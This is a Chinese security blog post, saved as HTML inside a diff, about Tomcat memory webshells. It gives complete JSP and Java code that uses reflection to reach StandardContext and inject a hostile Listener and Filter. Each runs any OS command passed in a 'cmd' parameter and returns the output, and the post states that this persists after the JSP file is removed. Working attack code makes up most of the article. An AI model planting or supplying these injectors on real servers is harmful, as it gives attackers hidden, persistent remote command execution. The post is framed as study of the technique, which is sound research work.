@@ -1,0 +1,332 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="内存马简述Tomcat内存马是指存在于Tomcat容器中的 Listener, Filter, Servlet等攻击者注册的恶意服务, 通常情况是需要攻击者上传一个 jsp文件执行其中的代码达到动态注册上述恶意服务的行为。不过目前也有师傅研究过很多关于Tomcat中如何实现通用回显的问题, 无需通过落地的 jsp文件执行代码, 在一些RCE漏洞中能够实现真正的无落地内存Webshell, 这一部分">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Tomcat内存马学习">
+<meta property="og:url" content="http://yoursite.com/2021/08/21/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/index.html">
+<meta property="og:site_name" content="Search is Null">
+<meta property="og:description" content="内存马简述Tomcat内存马是指存在于Tomcat容器中的 Listener, Filter, Servlet等攻击者注册的恶意服务, 通常情况是需要攻击者上传一个 jsp文件执行其中的代码达到动态注册上述恶意服务的行为。不过目前也有师傅研究过很多关于Tomcat中如何实现通用回显的问题, 无需通过落地的 jsp文件执行代码, 在一些RCE漏洞中能够实现真正的无落地内存Webshell, 这一部分">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/008i3skNly1gryzufcxx8j316q0u0mzi.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/008i3skNly1gryzuwphfzj316q0u0wh8.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/008i3skNly1grz4xmqza9j327y0g67d3.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/008i3skNly1grz4wf5wfrj327y01gac5.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/008i3skNly1grz4wsnnzjj327y03k76d.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/008i3skNly1grz8iiut7fj316q0u040o.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/008i3skNly1grz905wp3hj316q0u0go1.jpg">
+<meta property="article:published_time" content="2021-08-21T06:59:57.000Z">
+<meta property="article:modified_time" content="2021-08-21T07:00:29.671Z">
+<meta property="article:author" content="Search?&#x3D;Null">
+<meta property="article:tag" content="Java">
+<meta property="article:tag" content="内存马">
+<meta property="article:tag" content="Tomcat">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://tva1.sinaimg.cn/large/008i3skNly1gryzufcxx8j316q0u0mzi.jpg">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>Tomcat内存马学习</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+      
+<link rel="stylesheet" href="/css/rtl.css">
+
+    
+    <!-- rss -->
+    
+    
+      <link rel="alternate" href="/true" title="Search is Null" type="application/atom+xml" />
+    
+<meta name="generator" content="Hexo 4.2.1"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="https://github.com/exp1orer" target="_blank" rel="noopener">项目</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" href="/2021/07/24/SnakeYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2021/08/21/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/" target="_blank" rel="noopener"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2021/08/21/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/&text=Tomcat内存马学习" target="_blank" rel="noopener"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2021/08/21/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/&title=Tomcat内存马学习" target="_blank" rel="noopener"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2021/08/21/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/&is_video=false&description=Tomcat内存马学习" target="_blank" rel="noopener"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Tomcat内存马学习&body=Check out this article: http://yoursite.com/2021/08/21/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2021/08/21/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/&title=Tomcat内存马学习" target="_blank" rel="noopener"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2021/08/21/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/&title=Tomcat内存马学习" target="_blank" rel="noopener"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2021/08/21/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/&title=Tomcat内存马学习" target="_blank" rel="noopener"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2021/08/21/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/&title=Tomcat内存马学习" target="_blank" rel="noopener"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2021/08/21/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/&name=Tomcat内存马学习&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=http://yoursite.com/2021/08/21/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/&t=Tomcat内存马学习" target="_blank" rel="noopener"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#内存马简述"><span class="toc-number">1.</span> <span class="toc-text">内存马简述</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#StandardContext"><span class="toc-number">2.</span> <span class="toc-text">StandardContext</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Filter"><span class="toc-number">3.</span> <span class="toc-text">Filter</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Servlet"><span class="toc-number">4.</span> <span class="toc-text">Servlet</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#参考"><span class="toc-number">5.</span> <span class="toc-text">参考</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        Tomcat内存马学习
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Search is Null</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2021-08-21T06:59:57.000Z" itemprop="datePublished">2021-08-21</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link" href="/tags/Java/" rel="tag">Java</a>, <a class="tag-link" href="/tags/Tomcat/" rel="tag">Tomcat</a>, <a class="tag-link" href="/tags/%E5%86%85%E5%AD%98%E9%A9%AC/" rel="tag">内存马</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h3 id="内存马简述"><a href="#内存马简述" class="headerlink" title="内存马简述"></a>内存马简述</h3><p>Tomcat内存马是指存在于Tomcat容器中的 <code>Listener</code>, <code>Filter</code>, <code>Servlet</code>等攻击者注册的恶意服务, 通常情况是需要攻击者上传一个 <code>jsp</code>文件执行其中的代码达到动态注册上述恶意服务的行为。不过目前也有师傅研究过很多关于Tomcat中如何实现通用回显的问题, 无需通过落地的 <code>jsp</code>文件执行代码, 在一些RCE漏洞中能够实现真正的无落地内存Webshell, 这一部分会放在最后的参考内容中。</p>
+<h3 id="StandardContext"><a href="#StandardContext" class="headerlink" title="StandardContext"></a>StandardContext</h3><p> <code>StandardContext</code> 涉及的内容很多, 推荐大家阅读一些关于Tomcat的文章以了解该对象作用。</p>
+<p>这里就简述一下在JSP中如何获取 <code>StandardContext</code>对象, 因为JSP内置了 <code>request</code>和<code>response</code>对象, 所以通过反射就能够获取到了。</p>
+<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">    <span class="comment">// 低版本可能出错</span></span><br><span class="line">    ServletContext servletContext = request.getServletContext();</span><br><span class="line">    <span class="comment">// 反射获取ServletContext对象的context属性</span></span><br><span class="line">    Field servletContextField = servletContext.getClass().getDeclaredField(<span class="string">"context"</span>);</span><br><span class="line">    servletContextField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    <span class="comment">// 反射获取ApplicationContext对象</span></span><br><span class="line">    Object applicationServlet = servletContextField.get(servletContext);</span><br><span class="line">    <span class="comment">// 反射获取ApplicationContext的context属性</span></span><br><span class="line">    Field applicationContextField = applicationServlet.getClass().getDeclaredField(<span class="string">"context"</span>);</span><br><span class="line">    applicationContextField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    <span class="comment">// 反射获取StandardContext对象</span></span><br><span class="line">    StandardContext standardContext = (StandardContext) applicationContextField.get(applicationServlet);</span><br><span class="line">    EvilListener evil = <span class="keyword">new</span> EvilListener(request, response);</span><br><span class="line">    <span class="comment">// 添加监听器</span></span><br><span class="line">    standardContext.addApplicationEventListener(evil);</span><br><span class="line">		<span class="comment">// 打印信息</span></span><br><span class="line">		response.getWriter().write(<span class="string">"Inject Listener Success"</span>);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
+
+<p>恶意的Listener对象</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">EvilListener</span> <span class="keyword">implements</span> <span class="title">ServletRequestListener</span> </span>&#123;</span><br><span class="line">  	<span class="keyword">private</span> ServletRequest request;</span><br><span class="line">  	<span class="keyword">private</span> ServletRepsonse response;</span><br><span class="line"></span><br><span class="line">  	EvilListener(ServletRequest request, ServletResponse response) &#123;</span><br><span class="line">      	<span class="keyword">this</span>.request = request;</span><br><span class="line">      	<span class="keyword">this</span>.response = response;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  	<span class="meta">@Override</span></span><br><span class="line">  	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">requestDestoryed</span><span class="params">(ServletRequestEvent servletRequestEvent)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  	<span class="meta">@Override</span></span><br><span class="line">  	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">requestInitialized</span><span class="params">(ServletRequestEvent servletRequestEvent)</span> </span>&#123;</span><br><span class="line">      	String cmd = request.getParameter(<span class="string">"cmd"</span>);</span><br><span class="line">      	<span class="keyword">if</span> (cmd != <span class="keyword">null</span>) &#123;</span><br><span class="line">          	<span class="keyword">try</span> &#123;</span><br><span class="line">              	java.io.InputStream is = Runtime.getRuntime().exec(cmd).getInputStream();</span><br><span class="line">              	Scanner scanner = <span class="keyword">new</span> Scanner(is).useDelimiter(<span class="string">"\\a"</span>);</span><br><span class="line">              	String output = scanner.hasNext() ? scanner.next() : <span class="string">""</span>;</span><br><span class="line">              	response.getWriter().write(output);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>运行该JSP文件后则会动态注册一个 <code>Listener</code>, 传递 <code>cmd</code> 参数即可执行命令。</p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gryzufcxx8j316q0u0mzi.jpg" alt="image-20210629115059275"></p>
+<p>访问首页传递 <code>cmd=whoami</code>参数。</p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gryzuwphfzj316q0u0wh8.jpg" alt="image-20210629115129182"></p>
+<h3 id="Filter"><a href="#Filter" class="headerlink" title="Filter"></a>Filter</h3><p>Tomcat的运行流程是 <strong>Listener -&gt; Filter -&gt; Servlet</strong>, 如果我们能够注册一个<strong>Filter</strong>且保证它在<strong>FilterChain</strong>中是第一个的话则同样能够实现内存Webshell。</p>
+<p>在<strong>ApplicationFilterFactory#createFilterChain</strong>中通过for循环 <code>StandardContext</code>对象的 <code>filterMaps</code>属性, 在满足条件的情况下从 <code>StandardContext</code>的 <code>filterConfigs</code>属性取出对应 <code>filterName</code>的 <code>ApplicationFilterConfig</code>对象并添加到 <strong>filterChain</strong>中。</p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1grz4xmqza9j327y0g67d3.jpg" alt="image-20210629144705796"></p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1grz4wf5wfrj327y01gac5.jpg" alt="image-20210629144554427"><br><img src="https://tva1.sinaimg.cn/large/008i3skNly1grz4wsnnzjj327y03k76d.jpg" alt="image-20210629144618126"></p>
+<p>因此如果需要实现动态添加一个 <strong>Filter</strong>的话, 则需要在 <strong>StandardContext</strong>的 <code>filterConfigs</code>中添加需要注册的 <strong>Filter</strong>, 除此之外还需要在 <code>filterMaps</code>中也要添加 <strong>FilterMap</strong>对象, 其的用处在于设置 <strong>Filter</strong>的 URL匹配模式和 <strong>filterName</strong>, 这个 <strong>filterName</strong>对应存放在 <strong>StandardContext#filterConfigs</strong>中的key。</p>
+<hr>
+<p>首先实现一个恶意 <strong>Filter</strong>.</p>
+<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;%!</span><br><span class="line">    <span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">EvilFilter</span> <span class="keyword">implements</span> <span class="title">Filter</span> </span>&#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException </span>&#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doFilter</span><span class="params">(ServletRequest request, ServletResponse response, FilterChain filterChain)</span> <span class="keyword">throws</span> IOException, ServletException </span>&#123;</span><br><span class="line">            String cmd = request.getParameter(<span class="string">"cmd"</span>);</span><br><span class="line">            <span class="keyword">if</span> (cmd != <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    java.io.InputStream is = Runtime.getRuntime().exec(cmd).getInputStream();</span><br><span class="line">                    Scanner scanner = <span class="keyword">new</span> Scanner(is).useDelimiter(<span class="string">"\\a"</span>);</span><br><span class="line">                    String output = scanner.hasNext() ? scanner.next() : <span class="string">""</span>;</span><br><span class="line">                    response.getWriter().write(output);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">          	filterChain.doFilter(request, response);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">destroy</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>然后添加到 <strong>StandardContext</strong>对象的 <strong>filterConfigs</strong>中。（<strong>EvilListener</strong>对象存放在<strong>FilterDef</strong>的<strong>filter</strong>属性, 而<strong>FilterDef</strong>又存放在<strong>ApplicationFilterConfig</strong>的<strong>filterDef</strong>属性, 最后<strong>ApplicationFilterConfig</strong>对象 <code>put</code>到了<strong>StandardContext</strong>对象的<strong>filterConfigs</strong>属性中）</p>
+<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- 导入类 --&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"org.apache.catalina.core.StandardContext"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"org.apache.catalina.core.ApplicationContext"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"java.lang.reflect.Field"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"java.io.IOException"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"org.apache.tomcat.util.descriptor.web.FilterDef"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"org.apache.tomcat.util.descriptor.web.FilterMap"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"java.lang.reflect.Constructor"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"org.apache.catalina.Context"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"java.util.HashMap"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"java.io.BufferedReader"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"java.io.InputStreamReader"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"java.util.Scanner"</span> %&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">    <span class="comment">// 第一步, 获取StandardContext对象</span></span><br><span class="line">    ServletContext servletContext = request.getServletContext();</span><br><span class="line">    Field servletContextFIeld = servletContext.getClass().getDeclaredField(<span class="string">"context"</span>);</span><br><span class="line">    servletContextFIeld.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    ApplicationContext applicationContext = (ApplicationContext) servletContextFIeld.get(servletContext);</span><br><span class="line">    Field applicationContextField = applicationContext.getClass().getDeclaredField(<span class="string">"context"</span>);</span><br><span class="line">    applicationContextField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    StandardContext standardContext = (StandardContext) applicationContextField.get(applicationContext);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 第二步, 添加恶意Filter</span></span><br><span class="line">    FilterDef filterDef = <span class="keyword">new</span> FilterDef();</span><br><span class="line">    <span class="comment">// 设置Filter名字</span></span><br><span class="line">    filterDef.setFilterName(<span class="string">"EvilFilter"</span>);</span><br><span class="line">    standardContext.addFilterDef(filterDef);</span><br><span class="line">    EvilFilter evil = <span class="keyword">new</span> EvilFilter();</span><br><span class="line">    <span class="comment">// 设置Filter为恶意的Filter</span></span><br><span class="line">    filterDef.setFilter(evil);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 第三步, 添加到filterConfigs中</span></span><br><span class="line">    Field filterConfigsField = standardContext.getClass().getDeclaredField(<span class="string">"filterConfigs"</span>);</span><br><span class="line">    filterConfigsField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    HashMap filterConfigs = (HashMap) filterConfigsField.get(standardContext);</span><br><span class="line">    Constructor constructor = Class.forName(<span class="string">"org.apache.catalina.core.ApplicationFilterConfig"</span>).getDeclaredConstructor(Context<span class="class">.<span class="keyword">class</span>, <span class="title">FilterDef</span>.<span class="title">class</span>)</span>;</span><br><span class="line">    constructor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    filterConfigs.put(<span class="string">"EvilFilter"</span>, constructor.newInstance(standardContext, filterDef));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 第四步, 添加URL匹配模式和FilterName</span></span><br><span class="line">    FilterMap filterMap = <span class="keyword">new</span> FilterMap();</span><br><span class="line">    filterMap.addURLPattern(<span class="string">"/*"</span>);</span><br><span class="line">    filterMap.setFilterName(<span class="string">"EvilFilter"</span>);</span><br><span class="line">    standardContext.addFilterMapBefore(filterMap);</span><br><span class="line">    response.getWriter().write(<span class="string">"Inject Filter Success!"</span>);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
+
+<p>启动Tomcat访问JSP文件, 当页面出现 <em>Inject Filter Success</em>字符串表示Filter已经注入成功。</p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1grz8iiut7fj316q0u040o.jpg" alt="image-20210629165058468"></p>
+<p>此时在任意路径下只要携带 <code>cmd</code>参数即可执行命令, 即使删除原来注入Filter的JSP也不影响。</p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1grz905wp3hj316q0u0go1.jpg" alt="image-20210629170755716"></p>
+<h3 id="Servlet"><a href="#Servlet" class="headerlink" title="Servlet"></a>Servlet</h3><p>Google看了些文章说是只支持在初始化时动态注册Servlet, 而非运行时能够进行动态注册。</p>
+<p>这部分有待深入源码分析, 留个坑。</p>
+<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="http://li9hu.top/tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E4%B8%80-%E5%88%9D%E6%8E%A2/" target="_blank" rel="noopener">Tomcat内存马(一) 初探 - li9hu’s Blog</a></p>
+<p><a href="https://xz.aliyun.com/t/7348" target="_blank" rel="noopener">Tomcat中一种半通用回显方法</a></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="https://github.com/exp1orer" target="_blank" rel="noopener">项目</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#内存马简述"><span class="toc-number">1.</span> <span class="toc-text">内存马简述</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#StandardContext"><span class="toc-number">2.</span> <span class="toc-text">StandardContext</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Filter"><span class="toc-number">3.</span> <span class="toc-text">Filter</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Servlet"><span class="toc-number">4.</span> <span class="toc-text">Servlet</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#参考"><span class="toc-number">5.</span> <span class="toc-text">参考</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2021/08/21/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/" target="_blank" rel="noopener"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2021/08/21/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/&text=Tomcat内存马学习" target="_blank" rel="noopener"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2021/08/21/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/&title=Tomcat内存马学习" target="_blank" rel="noopener"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2021/08/21/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/&is_video=false&description=Tomcat内存马学习" target="_blank" rel="noopener"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Tomcat内存马学习&body=Check out this article: http://yoursite.com/2021/08/21/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
